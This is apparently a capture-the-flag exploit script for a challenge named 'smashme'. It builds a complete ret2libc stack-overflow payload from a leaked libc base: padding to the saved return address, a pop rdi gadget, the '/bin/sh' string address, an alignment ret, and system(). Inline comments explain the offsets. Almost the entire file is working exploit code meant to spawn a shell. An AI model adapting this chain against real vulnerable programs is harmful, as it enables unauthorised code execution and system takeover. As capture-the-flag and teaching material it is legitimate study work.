#!/usr/bin/env python3
# Copyright (c) 2026 Zetier
# SPDX-License-Identifier: Apache-2.0
# mypy: disable-error-code="no-untyped-call"
# smashme-ret2libc.py -- "smashme" (pwn 200): textbook ret2libc
# libc base leaked last round via puts(got.puts); offsets from ropper.
import struct

p64 = lambda v: struct.pack("<Q", v)

LIBC_BASE = 0x00007F1FBABC0000  # the leak -- you get one every run
POP_RDI   = LIBC_BASE + 0x02A3E5  # pop rdi ; ret
RET       = LIBC_BASE + 0x029CD6  # ret            <- movaps aligner, see below
SYSTEM    = LIBC_BASE + 0x052290  # system()
BINSH     = LIBC_BASE + 0x1B45BD  # "/bin/sh" in libc's .rodata

# offset lore: 128-byte buf + 8 saved rbp = 136 to saved RIP.
# !! if the buffer ever changes size, retune 136 AND the b"A"* count below.
# !! rev A binary. rev B allegedly shrank the buf to 120 -- NOT retuned here.
OFFSET = 136  # 128 buf + 8 rbp.  MUST match the pad length.  MUST.

payload  = b"A" * OFFSET   # pad: buf + saved rbp (the 8 rbp bytes ride along)
payload += p64(POP_RDI)    # saved RIP -> pop rdi ; ret
payload += p64(BINSH)      # rdi = "/bin/sh"
payload += p64(RET)        # +8 alignment: system's movaps wants rsp%16==0 at entry.
                           # drop this and it SIGSEGVs *inside* system -- ask me how I know.
payload += p64(SYSTEM)     # and we're done

assert len(payload) == OFFSET + 4 * 8, "chain drifted -- recount the p64s"
PAYLOAD = bytes(payload)

if __name__ == "__main__":
    print(f"before payload: {PAYLOAD.hex()}")
